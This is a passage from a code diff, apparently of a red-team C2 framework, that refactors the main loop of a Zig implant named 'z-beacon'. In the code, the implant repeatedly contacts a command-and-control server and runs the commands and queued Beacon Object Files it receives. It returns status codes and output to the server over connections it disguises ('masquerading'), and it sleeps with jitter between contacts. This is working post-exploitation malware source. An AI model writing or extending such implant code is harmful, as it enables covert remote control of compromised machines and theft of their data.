-        std.log.info("Bof launcher status code: {d}", .{bof_res.status_code});
+        //
+        // Sending results (status code & output) to C2 server 
+        //
+        std.log.info("BOF status code: {d}", .{bof_res.status_code});
+        if (bof_res.len > 0) {
+            //std.log.info("BOF output len: {d}", .{bof_res.len});
+            std.log.info("Bof launcher output: {s}", .{bof_res.output.?[0..bof_res.len]});
+        }
 
         // establishing connection
-        const addr = try std.fmt.allocPrintZ(allocator, "POST http://{s}{s}", .{ state.c2_host, state.c2_endpoint });
-        defer allocator.free(addr);
-        std.log.info("\nsending results to {s}", .{addr});
-        const req = state.implant_actions.netConnect(state, addr);
+        const net_conn = state.implant_actions.netConnect(state, netConnectionType.TaskResult, null);
 
-        if (req) |req_raw| {
-            // masquerading results in HTTP response
-            std.log.info("\nprzed netMasquerade", .{});
-            _ = state.implant_actions.netMasquerade(state, req_raw, &bof_res);
+        if (net_conn) |conn| {
+            var body_len: u32 = bof_res.len;
+            _ = state.implant_actions.netExchange(state, netConnectionType.TaskResult, conn, &body_len, @constCast(@ptrCast(&bof_res)));
 
-            if (bof_res.output) |output| {
-                _ = state.implant_actions.netSend(state, req_raw, @constCast(@ptrCast(output.ptr)), @intCast(output.len));
-                allocator.free(output);
-            } else _ = state.implant_actions.netSend(state, req_raw, null, 0);
-
-            var body_resp_len: u32 = 0;
-            const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(state, req_raw, &body_resp_len));
-
-            _ = resp_content;
-
-            state.implant_actions.netDisconnect(state, req_raw);
+            state.implant_actions.netDisconnect(state, conn);
         }
 
         allocator.free(pending_bof.task_id);
@@ -608,43 +845,45 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 }
 
 pub export fn go(_: ?[*]u8, _: i32) callconv(.C) u8 {
+
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    std.log.info("z-beacon launched", .{});
-
     var state = State.init(allocator) catch unreachable;
     defer state.deinit(allocator);
 
-    const heartbeat_request = std.fmt.allocPrintZ(allocator, "GET http://{s}{s}", .{ state.c2_host, state.c2_endpoint }) catch unreachable;
-    defer allocator.free(heartbeat_request);
+    std.log.info("z-beacon launched", .{});
+
 
     while (true) {
         // connect to C2 server
-        const req = state.implant_actions.netConnect(&state, heartbeat_request);
+        const net_conn = state.implant_actions.netConnect(&state, netConnectionType.Heartbeat, null);
 
-        if (req) |req_raw| {
-            _ = state.implant_actions.netSend(&state, req_raw, null, 0);
-
-            // fetch data (if any) from C2 server
+        if (net_conn) |conn| {
             var body_len: u32 = 0;
-            const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(&state, req_raw, &body_len));
+            const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(&state, netConnectionType.Heartbeat, conn, &body_len, null));
 
-            // unmask received data
-            const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, req_raw, resp_content, &body_len));
+            // unmask received data and process command (if any)
+            if (body_len > 0) {
+                //const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, req_raw, resp_content, &body_len));
 
-            // process command (if any)
-            if (unmasked_resp_content) |buf| {
-                processCommands(allocator, &state, buf[0..body_len]) catch {};
+                //if (unmasked_resp_content) |buf| {
+                if (resp_content) |buf| {
+                    std.log.info("Before processCommands", .{});
+                    processCommands(allocator, &state, buf[0..body_len]) catch {};
+                    std.log.info("After processCommands", .{});
+                }
             }
 
             // disconnect from C2 server
-            state.implant_actions.netDisconnect(&state, req_raw);
+            state.implant_actions.netDisconnect(&state, conn);
+            std.log.info("After netDisconnect", .{});
 
-            // process queued BOFs
-            processPendingBofs(allocator, &state) catch {};
         }
+
+        // process queued BOFs
+        processPendingBofs(allocator, &state) catch {};
 
         std.time.sleep(state.jitter * @as(u64, 1e9));
     }
